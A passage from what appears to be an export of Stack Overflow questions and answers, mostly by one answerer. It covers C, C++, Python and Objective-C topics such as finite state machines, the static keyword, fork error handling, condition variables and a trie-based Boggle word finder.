}
#endif
</code></pre>
"
"<p>I have three X/Y points that form a parabola. I simply need to calculate what the vertex of the parabola is that goes through these three points. Preferably a quick way as I have to do a LOT of these calculations!</p>

<p>The ""Ask A Scientist"" website provides <a href=""http://www.newton.dep.anl.gov/askasci/math99/math99028.htm"">this answer</a>:</p>

<blockquote>
  <p>The general form of a parabola is given by the equation: A * x^2 + B * x + C = y where A, B, and C are arbitrary Real constants. You have three pairs of points that are (x,y) ordered pairs. Substitute the x and y values of each point into the equation for a parabola. You will get three LINEAR equations in three unknowns, the three constants. You can then easily solve this system of three equations for the values of A, B, and C, and you'll have the equation of the parabola that intersects your 3 points. The vertex is where the first derivative is 0, a little algebra gives: ( -B/2A , C - B^2/4A ) for the vertex.</p>
</blockquote>

<p>It would be nice to see actual code that does this calculation in C# or C++. Anybody?</p>
","9530","Adam Rosenfield","<p>This smells like homework.  ""Ask a Scientist"" is right on.  Say your 3 points are (x1, y1), (x2, y2), and (x3, y3).  Then, you get three linear equations:</p>

<pre>
| M<sub>11</sub> M<sub>12</sub> M<sub>13</sub> |   | A |   | Z<sub>1</sub> |
| M<sub>21</sub> M<sub>22</sub> M<sub>23</sub> | * | B | = | Z<sub>2</sub> |
| M<sub>31</sub> M<sub>32</sub> M<sub>33</sub> |   | C |   | Z<sub>3</sub> |
</pre>

<p>Where M<sub>11</sub> = x<sub>1</sub><sup>2</sup>, M<sub>12</sub> = x<sub>1</sub>, M<sub>13</sub> = 1, Z<sub>1</sub> = y<sub>1</sub>, and similarly for the other two rows using (x2, y2) and (x3, y3) in place of (x1, y1).</p>

<p>Solving this system of 3 equations will give you a solution for A, B, and C.</p>
"
"<p>In the Stack Overflow podcasts, Joel Spolsky constantly harps on Jeff Atwood about Jeff not knowing how to write code in C. His statement is that ""knowing C helps you write better code."" He also always uses some sort of story involving string manipulation and how knowing C would allow you to write more efficient string routines in a different language.</p>

<p>As someone who knows a little C, but loves to write code in perl and other high-level languages, I have never once come across a problem that I was able to solve by writing C. </p>

<p>I am looking for examples of real-world situations where knowing C would be useful while writing a project in a high-level/dynamic language like perl or python.</p>

<p>Edit: Reading some of the answers you guys have submitted have been great, but still doesn't make any sense to me in this regard:</p>

<p>Take the strcat example. There's a right way and a wrong way to combine strings in C. But why should I (as a high-level developer) think that I am smarter than Larry Wall? Why wouldn't the language designers write the string manipulation code the right way?</p>
","9530","Adam Rosenfield","<p>It's hard to quantify exactly, but having an understanding of C will give your more insight into how higher-level language constructs are implemented, and as a consequence you'll be better able to use the constructs in an intelligent manner.</p>
"
"<p>Suppose you have a function 'normalize' which takes a list of numbers (representing a vector) as input and returns the normalized vector.  What should the result be when the vector is all zeros or the sum of its components is zero?</p>
","9530","","<p>As has already been mentioned several times, you can't normalize a zero vector.  So, your options are:</p>

<ol>
<li>Return the zero vector</li>
<li>Return NaN</li>
<li>Return a bit indicating if the vector was successfully normalized, in addition to the result if successful</li>
<li>Throw an exception</li>
</ol>

<p>Option 4 is not very good because some languages (such as C) don't have exceptions, and normalizing a vector is typically found in very low-level code.  Throwing an exception is rather expensive, and any code that may want to handle the zero/small vector case is going to be given an unnecessary performance hit when that happens.</p>

<p>Option 1 has the problem that the return value won't have a unit length, and so it could silently introduce bugs in the calling code that assumes the resulting vector has unit length.</p>

<p>Option 2 has a similar problem to option 1, but because NaNs are usually much more noticeable than zeroes, it will likely manifest more easily.</p>

<p>I think Option 3 is the best solution, although it does make the interface more complicated.  Instead of saying</p>

<pre><code>vec3 = myVec.normalize();
</code></pre>

<p>You now have to say something like</p>

<pre><code>vec3 result;
bool success = myVec.normalize(&amp;result);
if(success)
    // vector was normalized
else
    // vector was zero (or small)
</code></pre>
"
"<p>Does anyone know why there is some hesitation when you hold down a keyboard key and try to process it? I'm calling a function right in my WinProc(...) that will move an image on the screen (OpenGL) when a key is held down. I press it and get a single response, then there is about .5 seconds of nothing, then it behaves as normal (moves 1 pixel every WinMain loop).</p>

<p>I'm wondering if the Windows messages are being delayed somehow because of some feature I need to disable???</p>

<p>Here's my code:</p>

<pre><code>int WINAPI WinMain(HINSTANCE hinstance, HINSTANCE hprevinstance, LPSTR lpcmdline, int nshowcmd)
{
    bool quit = false;
    MSG msg;

    createWindow(hinstance, SCRW, SCRH, SCRD, WINDOWED);

    // Main loop
    while (!quit)
    {		
    	if (PeekMessage(&amp;msg, NULL, NULL, NULL, PM_REMOVE))
    	{
    		if (msg.message == WM_QUIT)
    			quit = true;

    		TranslateMessage(&amp;msg);
    		DispatchMessage(&amp;msg);
    	}

        renderFrame();        // processes graphics
    	SwapBuffers(hdc);
    }
    return msg.lParam;
}
</code></pre>

<p>and WinProc (there were more cases but same thing...):</p>

<pre><code>    LRESULT CALLBACK WinProc(HWND hwnd, UINT msg, WPARAM wparam, LPARAM lparam)
    {
        switch(msg)
        {
        	case WM_KEYDOWN:
        		switch ( wparam )
        		{
        			case VK_RIGHT:
        				key_RIGHT();
        				return 0;
        		}
        		return 0;
}
}
</code></pre>

<p>and key_RIGHT:</p>

<pre><code>void key_RIGHT()
{
    MoveObjectRight1Pixel();
}
</code></pre>
","9530","","<p>It's a rather standard keyboard setting to have a small delay between when the key was pressed and when repeat messages get generated.</p>

<p>Instead of processing keyboard input in your Windows message handler, you could instead keep an array of 256 bits indicating the current state of the keyboard.  When you receive a <code>WM_KEYDOWN</code> or <code>WM_KEYUP</code>, you update the bit of the corresponding key.  Then, in your main loop, you check the current state of the key and the previous state of the key (by keeping a second array of 256 bits that you make a copy to every frame).</p>

<p>If the key is currently down but was not down in the previous frame, then you move your object accordingly.</p>

<p>Another alternative is to use the <a href=""http://msdn.microsoft.com/en-us/library/ms646293%28VS.85%29.aspx"" rel=""nofollow""><code>GetAsyncKeyState()</code></a> function.</p>
"
"<p>I want to write an FSM which starts with an idle state and moves from one state to another based on some event. I am not familiar with coding of FSM and google didn't help.
Appreciate if someone could post the C data structure that could be used for the same.</p>

<p>Thanks,
syuga2012</p>
","9530","","<p>See <a href=""http://en.wikipedia.org/wiki/Finite%5Fstate%5Fmachine#Mathematical%5Fmodel"" rel=""nofollow"">Wikipedia</a> for the formal definition.  You need to decide on your set of states <em>S</em>, your input alphabet &Sigma; and your transition function &delta;.  The simplest representation is to have <em>S</em> be the set of integers 0, 1, 2, ..., <em>N</em>-1, where <em>N</em> is the number of states, and for &Sigma; be the set of integers 0, 1, 2, ..., <em>M</em>-1, where <em>M</em> is the number of inputs, and then &delta; is just a big <em>N</em> by <em>M</em> matrix.  Finally, you can store the set of accepting states by storing an array of <em>N</em> bits, where the <em>i</em>th bit is 1 if the <em>i</em>th state is an accepting state, or 0 if it is not an accepting state.</p>

<p>For example, here is the FSM in Figure 3 of the Wikipedia article:</p>

<pre><code>#define NSTATES 2
#define NINPUTS 2
const int transition_function[NSTATES][NINPUTS] = {{1, 0}, {0, 1}};
const int is_accepting_state[NSTATES] = {1, 0};

int main(void)
{
    int current_state = 0;  // initial state
    while(has_more_input())
    {
        // advance to next state based on input
        int input = get_next_input();
        current_state = transition_function[current_state][input];
    }

    int accepted = is_accepting_state[current_state];
    // do stuff
}
</code></pre>
"
"<p>I want to know what could be the equivalent keyword in java which could perform same function as ""Static keyword in C"".. I want to do recursion in java, performing same function that a static keyword in C does...</p>

<p>Please help..</p>
","9530","","<p>C has two entirely different uses of the <code>static</code> keyword, and C++ adds a third use:</p>

<pre><code>// Use 1: declare a variable or function to be local to a given module
// At global scope:
static int global_var;
static void func();
</code></pre>

<p>In this case, the global variable <code>global_var</code> and the function <code>void func()</code> can only be accessed inside the file in which they are declared; they cannot be accessed by any other file.</p>

<pre><code>// Use 2: declare a variable inside a function with global scope
void func(void)
{
    static int x;
}
</code></pre>

<p>In this case, the variable <code>x</code> is effectively a global variable, in that there is only one instance of it -- multiple calls to <code>func()</code> (including recursive calls) will always access the same variable.</p>

<pre><code>// Use 3 (C++ only): declare a global variable with class scope
class Widget
{
public:
    static int var;
};
</code></pre>

<p>In this case, this declares the variable <code>Widget::var</code> as a global variable, but its scope is different.  Outside of class member functions, it has to be named as <code>Widget::var</code>; inside class member functions, it can be named as just <code>var</code>.  It can also be made <code>protected</code> or <code>private</code> to limit its scope even more.</p>

<p>Now, what are the analogs of these 3 uses in Java?</p>

<p>Case 1 has no direct analog; the closest is declaring objects with package scope, which is done by omitting a <code>public</code>, <code>protected</code>, or <code>private</code>:</p>

<pre><code>class Widget  // Declare a class with package scope
{
    int x;  // Declare a member variable with package scope
    void func() {}  // Declare a member function with package scope
}
</code></pre>

<p>In this case, the declared objects are only accessible by classes within the same package; they are not accessible to other packages.</p>

<p>Case 2 also does not have an analog in Java.  The closest you can get is by declaring a global variable (that is, a static class variable, since Java doesn't have true global variables in the strictest sense):</p>

<pre><code>class Widget
{
    private int func_x;
    public static void func()
    {
        // use func_x here in place of 'static int x' in the C example
    }
}
</code></pre>

<p>Case 3 is the only case that has a <em>direct</em> analog in Java.  In this case, the <code>static</code> keyword serves exactly the same purpose.</p>
"
"<p>I am maintaining a carbon C++ application on OS X. There is a ""spin lock"" in one of the objects in the code that looks like this,</p>

<pre><code>while ( mState != RELEASED )
{
	sleep( 1 );
}
</code></pre>

<p>There is a post render maintenance callback that is fed to AudioUnitAddRenderNotify() that would set the mState of these various objects.</p>

<p>I was thinking about using the built-in OSSpinLock family of functions to replace this (if nothing else because they are thread safe and the above code doesn't seem to be).</p>

<p>Would this be a reasonable equivalent? Should I also add some lock protection in the maintenance thread which manipulates the mState of these objects?</p>

<pre><code>OSSpinLock spin_lock = OS_SPINLOCK_INIT;

if (!OSSpinLockTry(&amp;spin_lock))
	OSSpinLockLock(&amp;spin_lock);

while (mState != RELEASED)
    OSSpinLockTry(&amp;spin_lock);

OSSpinLockUnlock(&amp;spin_lock);
</code></pre>
","9530","","<p>Don't use a spinlock -- spinlocks waste CPU cycles, looping endlessly until they get the lock.  Spinlocks should only be used when the time that the lock will be held will be very short.</p>

<p>A better alternative would be to use a <a href=""http://en.wikipedia.org/wiki/Condition%5Fvariable"">condition variable</a>, such as the ones available in the <a href=""https://computing.llnl.gov/tutorials/pthreads/#ConditionVariables"">pthreads</a> library.  This way, your thread will sleep and not waste any CPU cycles until the condition is satisfied.  See the example listed in that link for how to use pthreads condition variables.</p>
"
"<p>I have several PDFs with the following properties:</p>

<p>Each PDF contains a variable number of ""documents"" with differing number of pages.</p>

<p>Each page in a ""document"" has text such as ""Page 3 of 26"".</p>

<p>I want to be able to automatically identify the first and last page of each ""document"" within a PDF (Note: this is not the same as the first and last page of a PDF as each PDF may contain several ""documents"") and extract these into a new PDF for later printing and archival. </p>

<p>I'm not sure what tools I can bring to bear on this problem and what libraries are available to tackle this.</p>

<p>Any recommendations? Preferably free and can be used to create a tool that will run on Windows.</p>
","9530","","<p>You can try using <a href=""http://www.pdfhacks.com/pdftk/"" rel=""nofollow"">pdftk</a> to decompress the PDF, parse the data, split it, and then recompress it.</p>
"
"<p>Occasionally I need to use fixed-width integers for communication with external devices like PLCs. I also use them to define bitmasks and perform bit manipulation of image data. AFAIK the C99 standard defines fixed-width integers like int16_t. However the compiler I use, VC++ 2008 doesn't support C99 and AFAIK Microsoft is not planning to support it. </p>

<p>My question is what is the best practice for using fixed-width integers in C++? </p>

<p>I know that VC++ defines non-standard fixed-width integers like __int16, but I am hesitant to use a non-standard type. Will the next C++ standard define fixed-width integers?    </p>
","9530","","<p>Include the file <code>&lt;stdint.h&gt;</code> to get the definitions for types like <code>uint16_t</code>.  VC++ doesn't come with <code>&lt;stdint.h&gt;</code> by default, but you can get that file from several places.  <a href=""http://en.wikipedia.org/wiki/Stdint.h#Downloads"">Wikipedia</a> lists a few, and Google will find you lots more.</p>
"
"<p>I need to include an html page (table of contents) on a CD/DVD.  I'd like the html page to open automatically when the user puts the CD/DVD in their machine.  Is there a way to do this (the MSDN cds do this) either by purchasing software or otherwise?</p>
","9530","","<p>You should be able to do with a relatively simple <code>autorun.inf</code> file in the CD/DVD's root directory:</p>

<pre><code>[autorun]
shellexecute=path\to\htmlfile.html
</code></pre>
"
"<p>What's the best technique for exiting from a constructor on an error condition in C++? In particular, this is an error opening a file.</p>

<p>Thanks for the responses. I'm throwing an exception. Here's the code (don't know if it's the <em>best</em> way to do it, but it's simple)</p>

<pre><code>// Test to see if file is now open; die otherwise 
if ( !file.is_open() ) {
	cerr &lt;&lt; ""Failed to open file: "" &lt;&lt; m_filename &lt;&lt; endl;
	throw (""Failed to open file"");
}
</code></pre>

<p>One think I like about C++ is you don't have to declare thrown exceptions on the method declarations.</p>
","9530","","<p>You can throw an exception, as others have mentioned, or you can also refactor your code so that your constructor can't fail.  If, for example, you're working on a project where exceptions are disabled or disallowed, then the latter is your best option.</p>

<p>To make a constructor that can't fail, refactor the code that could potentially fail into an <code>init()</code> method, and have the constructor do as little work as possible, and then require all users of the class to call <code>init()</code> immediately after construction.  If <code>init()</code> fails, you can return an error code.  Make sure to document this in your class's documentation!</p>

<p>Of course, this is somewhat dangerous, since programmers might forget to call <code>init()</code>.  The compiler can't enforce this, so tread carefully, and try to make your code fail-fast if <code>init()</code> is not called.</p>
"
"<p>First, I'm not sure I really understand what a selector is.   From my understanding, it's the name of a method, and you can assign it to a class of type 'SEL' and then run methods such as respondToSelector to see if the receiver implements that method.   Can someone offer up a better explanation?</p>

<p>Secondly, to this point, I have the following code:  </p>

<pre><code>NSString *thing = @""Hello, this is Craig"";

SEL sel = @selector(lowercaseString:);
NSString *lower = (([thing respondsToSelector:sel]) ? @""YES"" : @""NO"");
NSLog (@""Responds to lowercaseString: %@"", lower);
if ([thing respondsToSelector:sel]) //(lower == @""YES"")
    NSLog(@""lowercaseString is: %@"", [thing lowercaseString]);
</code></pre>

<p>However, even though <code>thing</code> is clearly a kind of NSString, and should respond to lowercaseString, I cannot get the 'respondsToSelector' conditional to return ""YES""...</p>
","9530","","<p>You have to be very careful about the method names.  In this case, the method name is just ""<code>lowercaseString</code>"", not ""<code>lowercaseString:</code>"" (note the absence of the colon).  That's why you're getting <code>NO</code> returned, because <code>NSString</code> objects respond to the <code>lowercaseString</code> message but not the <code>lowercaseString:</code> message.</p>

<p>How do you know when to add a colon?  You add a colon to the message name if you would add a colon when calling it, which happens if it takes one argument.  If it takes zero arguments (as is the case with <code>lowercaseString</code>), then there is no colon.  If it takes more than one argument, you have to add the extra argument names along with their colons, as in <code>compare:options:range:locale:</code>.</p>

<p>You can also look at the <a href=""http://developer.apple.com/documentation/Cocoa/Reference/Foundation/Classes/NSString%5FClass/Reference/NSString.html#//apple%5Fref/occ/instm/NSString/lowercaseString"">documentation</a> and note the presence or absence of a trailing colon.</p>
"
"<p>I've been getting a compile error in <code>Code::Block</code> for an <code>SDL_Surface</code> variable. Strangely enough, this is the first time I have received this kind of error, as I have used this line of code previously and it has worked fine.</p>

<p>One (of several with the same problem) sample line of code that causes this problem is:</p>

<pre><code>extern SDL_Surface *screen;
</code></pre>

<p>The resulting error is this:</p>

<pre><code>expected init-declarator before ""extern""|
expected `,' or `;' before ""extern""|

||=== Build finished: 2 errors, 0 warnings ===|
</code></pre>

<p>I tried to understand the error, but I can not tell what it is. Does anyone know what might be wrong?</p>
","9530","","<p>It looks like you're missing the definition of <code>SDL_Surface</code>.  Make sure to <code>#include</code> the proper header file in which <code>SDL_Surface</code> is defined.  Alternatively, if you're not actually using the <code>screen</code> variable (i.e. you're not accessing any of its fields), you can declare it using an <em>incomplete type</em> as so:</p>

<pre><code>extern struct SDL_Surface *screen;
</code></pre>
"
"<p>For my understanding there are always two types of memory:</p>

<ul>
<li><p>the working storage</p></li>
<li><p>the ""disk space""</p></li>
</ul>

<p>So when you have a 16 GB iPhone, does it have 16 GB of working storage? or 16 GB of ""disk space""? Which ""Memory"" is Apple talking about in his Docs, when it comes to performance and memory management? It looks like the working storage, but I am not sure. Actually I thought the iPhone is a huge brick of working storage, since all that stuff is just a solid block of  chip memory (no hard drive).</p>
","9530","","<p>The iPhone has 16GB (or 8 or 4, depending on the model) of non-volatile flash memory that persists even when the power is turned off.  It also has 128MB of volatile DRAM that gets lost when the power is turned off.  The <strong>relative</strong> differences are:</p>

<ul>
<li>Flash memory is cheap, DRAM is expensive</li>
<li>Flash memory is slow, DRAM is fast</li>
<li>Flash memory is non-volatile, DRAM is volatile</li>
</ul>

<p>The flash memory is essentially like a hard drive, except it's a solid-state memory, not a rotating platter of magnetic dipoles.</p>

<p>Generally, in iPhone development, when you're talking about memory, you're talking about DRAM.  DRAM is a more limited resource and more likely to run out, since it's very easy for an app do eat up megabytes by poor memory management.  It's a lot harder to run out of flash memory, since doing so would involve writing very large files into the file system.</p>
"
"<p>I've wanted to test if with multiply processes I'm able to use more than 4GB of ram on 32bit O.S (mine: Ubuntu with 1GB ram).</p>

<p>So I've written a small program that mallocs slightly less then 1GB, and do some action on that array, and ran 5 instances of this program vie forks.</p>

<p>The thing is, that I suspect that O.S killed 4 of them, and only one survived and displayed it's ""PID: I've finished"").</p>

<p>(I've tried it with small arrays and got 5 printing, also when I look at the running processes with TOP, I see only one instance..)</p>

<p>The weird thing is this - I've received return code 0 (success?) in ALL of the instances, including the ones that were allegedly killed by O.S.</p>

<p>I didn't get any massage stating that processes were killed.</p>

<p>Is this return code normal for this situation?</p>

<p>(If so, it reduces my trust in 'return codes'...)</p>

<p>thanks.</p>

<p>Edit: some of the answers suggested possible errors in the small program, so here it is. the larger program that forks and saves return codes is larger, and I have trouble uploading it here, but I think (and hope) it's fine.    </p>

<p>Also I've noticed that if instead of running it with my forking program, I run it with terminal using './a.out &amp; ./a.out &amp; ./a.out  &amp; ./a.out &amp;' (when ./a.out is the binary of the small program attached)
I do see some 'Killed' messages.</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
#define SMALL_SIZE 10000
#define BIG_SIZE 1000000000
#define SIZE BIG_SIZE
#define REAPETS 1

    int
main()
{
    pid_t my_pid = getpid();

    char * x = malloc(SIZE*sizeof(char));

    if (x == NULL)
    {
            printf(""Malloc failed!"");
            return(EXIT_FAILURE);
    }

    int x2=0;
    for(x2=0;x2&lt;REAPETS;++x2)
    {
            int y;
            for(y=0;y&lt;SIZE;++y)
                    x[y] = (y+my_pid)%256;
    }
    printf(""%d: I'm over.\n"",my_pid);
    return(EXIT_SUCCESS);
}
</code></pre>
","9530","","<p>Have you checked the return value from <code>fork()</code>?  There's a good chance that if <code>fork()</code> can't allocate enough memory for the new process' address space, then it will return an error (-1).  A typical way to call <code>fork()</code> is:</p>

<pre><code>pid_t pid;
switch(pid = fork())
{
case 0:
    // I'm the child process
    break;
case -1:
    // Error -- check errno
    fprintf(stderr, ""fork: %s\n"", strerror(errno));
    break;
default:
    // I'm the parent process
}
</code></pre>
"
"<p>I'm working on a project on an 8051 where every byte counts.  As such, I am using some global variables where I normally wouldn't.  The normal method of passing pointers into a function adds too much overhead here.</p>

<p>I have a number of functions that use single bit variables (a compiler specific extension to C) to signal the outcome of a function in addition to the normal return value.</p>

<pre><code>bit global_error_flag = 0;
bit global_data_ready_flag = 0;

unsigned char A_Function (void) {
    // Do some stuff

    if ( badness ) {
        global_error_flag = 0;
        global_data_ready_flag = 1;

        return 0;
    }

    if ( data_is_ready_use ) {
        global_data_ready_flag = 1;
    }

    return a_value;    
}

void Other_Function (void) {
    unsigned char c;

    c = A_Function();

    if( global_error_flag) {
        // Do error stuff here.
    }
    else
    if( global_data_ready_flag ) {
        // Do data processing here.
    }
    global_error_flag = 0;
    global_data_ready_flag = 0;

}
</code></pre>

<p>Given that the technique is evil, is there some way I can make the code clearer?</p>

<p>How best should I indicate which function calls will have the side-effect of setting these flags?  Are comments enough?  Should I name the functions to indicate their API (quasi-hungarian-style)? Should I use a macro to mark such calls:</p>

<pre><code>#define FUNCTION_SETS_FLAGS(code) (code)

FUNCTION_SETS_FLAGS( c = A_Function() );
</code></pre>

<p>Any other ideas?</p>
","9530","","<p>This doesn't really help you, but GCC has a way to do the <em>opposite</em> of what you want: to mark functions which have <em>no</em> side effects.  See the <a href=""http://gcc.gnu.org/onlinedocs/gcc/Function-Attributes.html#index-g%5Ft%5F0040code%5F007bconst%5F007d-function-attribute-2203"" rel=""nofollow""><code>const</code></a> and <a href=""http://gcc.gnu.org/onlinedocs/gcc/Function-Attributes.html#index-g%5Ft%5F0040code%5F007bpure%5F007d-function-attribute-2252"" rel=""nofollow""><code>pure</code></a> attributes.  This is more for optimization than documentation, thought: if the compiler knows that a given function does not examine any data other than its arguments, it can perform smarter optimizations such as <a href=""http://en.wikipedia.org/wiki/Loop-invariant%5Fcode%5Fmotion"" rel=""nofollow"">loop-invariant code motion</a>.</p>
"
"<p>Lately I have been playing a game on my iPhone called Scramble. Some of you may know this game as Boggle. Essentially, when the game starts you get a matrix of letters like so:</p>

<pre><code>F X I E
A M L O
E W B X
A S T U
</code></pre>

<p>The goal of the game is to find as many words as you can that can be formed by chaining letters together. You can start with any letter, and all the letters that surround it are fair game, and then once you move on to the next letter, all the letters that surround that letter are fair game, <strong>except for any previously used letters</strong>. So in the grid above, for example, I could come up with the words <code>LOB</code>, <code>TUX</code>, <code>SEA</code>, <code>FAME</code>, etc. Words must be at least 3 characters, and no more than NxN characters, which would be 16 in this game but can vary in some implementations.  While this game is fun and addictive, I am apparently not very good at it and I wanted to cheat a little bit by making a program that would give me the best possible words (the longer the word the more points you get).</p>

<p><img src=""http://www.boggled.org/sample.gif"" alt=""Sample Boggle"" /></p>

<p>I am, unfortunately, not very good with algorithms or their efficiencies and so forth. My first attempt uses a dictionary <a href=""http://www.freebsd.org/cgi/cvsweb.cgi/src/share/dict/web2?rev=1.12;content-type=text%2Fplain"">such as this one</a> (~2.3MB) and does a linear search trying to match combinations with dictionary entries. This takes a <em>very</em> long time to find the possible words, and since you only get 2 minutes per round, it is simply not adequate.</p>

<p>I am interested to see if any Stackoverflowers can come up with more efficient solutions. I am mostly looking for solutions using the Big 3 Ps: Python, PHP, and Perl, although anything with Java or C++ is cool too, since speed is essential.</p>

<p><strong>CURRENT SOLUTIONS</strong>:</p>

<ul>
<li><a href=""#746102"">Adam Rosenfield</a>, Python, ~20s  </li>
<li><a href=""#746345"">John Fouhy</a>, Python, ~3s  </li>
<li><a href=""#746955"">Kent Fredric</a>, Perl, ~1s  </li>
<li><a href=""#750012"">Darius Bacon</a>, Python, ~1s  </li>
<li><a href=""#750722"">rvarcher</a>, VB.NET <a href=""http://www.myvrad.com/boggle/default.aspx"">(live link)</a>, ~1s</li>
<li><a href=""#757165"">Paolo Bergantino</a>, PHP <a href=""http://www.rootspot.com/stackoverflow/boggle.php"">(live link)</a>, ~5s (~2s locally)</li>
</ul>

<p><strong>BOUNTY</strong>:</p>

<p>I am adding a bounty to this question as my way of saying thanks to all the people who pitched in with their programs. Unfortunately I can only give the accepted answer to one of you, so I'll measure who has the fastest boggle solver 7 days from now and award the winner the bounty.</p>

<p>Bounty awarded. Thanks to everyone that participated.</p>
","9530","","<p>The fastest solution you're going to get will probably involve storing your dictionary in a <a href=""http://en.wikipedia.org/wiki/Trie"">trie</a>.  Then, create a queue of triplets (<em>x</em>, <em>y</em>, <em>s</em>), where each element in the queue corresponds to a prefix <em>s</em> of a word which can be spelled in the grid, ending at location (<em>x</em>, <em>y</em>).  Initialize the queue with <em>N</em> x <em>N</em> elements (where <em>N</em> is the size of your grid), one element for each square in the grid.  Then, the algorithm proceeds as follows:</p>

<pre>
While the queue is not empty:
  Dequeue a triple (x, y, s)
  For each square (x', y') with letter c adjacent to (x, y):
    If s+c is a word, output s+c
    If s+c is a prefix of a word, insert (x', y', s+c) into the queue
</pre>

<p>If you store your dictionary in a trie, testing if <em>s</em>+<em>c</em> is a word or a prefix of a word can be done in constant time (provided you also keep some extra metadata in each queue datum, such as a pointer to the current node in the trie), so the running time of this algorithm is O(number of words that can be spelled).</p>

<p><strong>[Edit]</strong> Here's an implementation in Python that I just coded up:</p>

<pre><code>#!/usr/bin/python

class TrieNode:
    def __init__(self, parent, value):
        self.parent = parent
        self.children = [None] * 26
        self.isWord = False
        if parent is not None:
            parent.children[ord(value) - 97] = self

def MakeTrie(dictfile):
    dict = open(dictfile)
    root = TrieNode(None, '')
    for word in dict:
        curNode = root
        for letter in word.lower():
            if 97 &lt;= ord(letter) &lt; 123:
                nextNode = curNode.children[ord(letter) - 97]
                if nextNode is None:
                    nextNode = TrieNode(curNode, letter)
                curNode = nextNode
        curNode.isWord = True
    return root

def BoggleWords(grid, dict):
    rows = len(grid)
    cols = len(grid[0])
    queue = []
    words = []
    for y in range(cols):
        for x in range(rows):
            c = grid[y][x]
            node = dict.children[ord(c) - 97]
            if node is not None:
                queue.append((x, y, c, node))
    while queue:
        x, y, s, node = queue[0]
        del queue[0]
        for dx, dy in ((1, 0), (1, -1), (0, -1), (-1, -1), (-1, 0), (-1, 1), (0, 1), (1, 1)):
            x2, y2 = x + dx, y + dy
            if 0 &lt;= x2 &lt; cols and 0 &lt;= y2 &lt; rows:
                s2 = s + grid[y2][x2]
                node2 = node.children[ord(grid[y2][x2]) - 97]
                if node2 is not None:
                    if node2.isWord:
                        words.append(s2)
                    queue.append((x2, y2, s2, node2))

    return words
</code></pre>

<p>Example usage:</p>

<pre><code>d = MakeTrie('/usr/share/dict/words')
print(BoggleWords(['fxie','amlo','ewbx','astu'], d))
</code></pre>

<p>Output:</p>

<blockquote>
  <p>['fa', 'xi', 'ie', 'io', 'el', 'am', 'ax', 'ae', 'aw', 'mi', 'ma', 'me', 'lo', 'li', 'oe', 'ox', 'em', 'ea', 'ea', 'es', 'wa', 'we', 'wa', 'bo', 'bu', 'as', 'aw', 'ae', 'st', 'se', 'sa', 'tu', 'ut', 'fam', 'fae', 'imi', 'eli', 'elm', 'elb', 'ami', 'ama', 'ame', 'aes', 'awl', 'awa', 'awe', 'awa', 'mix', 'mim', 'mil', 'mam', 'max', 'mae', 'maw', 'mew', 'mem', 'mes', 'lob', 'lox', 'lei', 'leo', 'lie', 'lim', 'oil', 'olm', 'ewe', 'eme', 'wax', 'waf', 'wae', 'waw', 'wem', 'wea', 'wea', 'was', 'waw', 'wae', 'bob', 'blo', 'bub', 'but', 'ast', 'ase', 'asa', 'awl', 'awa', 'awe', 'awa', 'aes', 'swa', 'swa', 'sew', 'sea', 'sea', 'saw', 'tux', 'tub', 'tut', 'twa', 'twa', 'tst', 'utu', 'fama', 'fame', 'ixil', 'imam', 'amli', 'amil', 'ambo', 'axil', 'axle', 'mimi', 'mima', 'mime', 'milo', 'mile', 'mewl', 'mese', 'mesa', 'lolo', 'lobo', 'lima', 'lime', 'limb', 'lile', 'oime', 'oleo', 'olio', 'oboe', 'obol', 'emim', 'emil', 'east', 'ease', 'wame', 'wawa', 'wawa', 'weam', 'west', 'wese', 'wast', 'wase', 'wawa', 'wawa', 'boil', 'bolo', 'bole', 'bobo', 'blob', 'bleo', 'bubo', 'asem', 'stub', 'stut', 'swam', 'semi', 'seme', 'seam', 'seax', 'sasa', 'sawt', 'tutu', 'tuts', 'twae', 'twas', 'twae', 'ilima', 'amble', 'axile', 'awest', 'mamie', 'mambo', 'maxim', 'mease', 'mesem', 'limax', 'limes', 'limbo', 'limbu', 'obole', 'emesa', 'embox', 'awest', 'swami', 'famble', 'mimble', 'maxima', 'embolo', 'embole', 'wamble', 'semese', 'semble', 'sawbwa', 'sawbwa']</p>
</blockquote>

<p>Notes: This program doesn't output 1-letter words, or filter by word length at all.  That's easy to add but not really relevant to the problem.  It also outputs some words multiple times if they can be spelled in multiple ways.  If a given word can be spelled in many different ways (worst case: every letter in the grid is the same (e.g. 'A') and a word like 'aaaaaaaaaa' is in your dictionary), then the running time will get horribly exponential.  Filtering out duplicates and sorting is trivial to due after the algorithm has finished.</p>
"
"<p>I was studying deconvolution, <br>
and stumbled upon <a href=""http://en.wikipedia.org/wiki/Richardson-Lucy%5Fdeconvolution"" rel=""nofollow"">Richardson-Lucy deconvolution</a>, <br>
I was thinking of writing a simple program to do post-processing using this method, <br>
does anybody know where I can find complete implementable algorithms or source code that I can study and play around with?  <br><br></p>

<p>Preferably in C++ language or matlab.</p>

<p>I have read a few books but they are a little general and too theoretical.</p>

<p>thanks, Charles Mawby.<br>
but i'm still having problems looking for the .m files online,<br>
all i get are reference form a reference not a real file.<br>
really appreciate if you can provide more details.<br>
thanks in advance!</p>
","9530","","<p>I would suggest using <a href=""http://www.mathworks.com/"" rel=""nofollow"">MATLAB</a>, or the F/OSS alternative <a href=""http://www.gnu.org/software/octave/"" rel=""nofollow"">GNU Octave</a>.  They're much better for this sort of thing, as they have libraries of image processing routines, and convolution is a heavily-optimized built-in function.</p>
"
"<p>In python, assignment operator can unpack list or tuple into variables, like this:</p>

<pre><code>l = (1, 2)
a, b = l # here goes auto unpack
</code></pre>

<p>But i need to specify exactly same amount of names to the left as an items count in the list to the right. But sometimes i don't know a size of the list to the right, for example if i use split(). Example:</p>

<pre><code>a, b = ""length=25"".split(""="") # this will result in a=""length"" and b=25
</code></pre>

<p>But the following code will lead an error:</p>

<pre><code>a, b = ""DEFAULT_LENGTH"".split(""="") # error, list has only 1 item
</code></pre>

<p>is it possible to somehow unpack list in the example above so i get a = ""DEFAULT_LENGTH"" and b equals to 'None' or not set? Straightforward way looks kinda long:</p>

<pre><code>a = b = None
if ""="" in string :
  a, b = string.split(""="")
else :
  a = string
</code></pre>
","9530","","<p>This is slightly better than your solution but still not very elegant; it wouldn't surprise me if there's a better way to do it.</p>

<pre><code>a, b = (string.split(""="") + [None])[:2]
</code></pre>
"
"<p>can best help me systematically modify the ""replace"" field of a regex search as it encounters each match.</p>

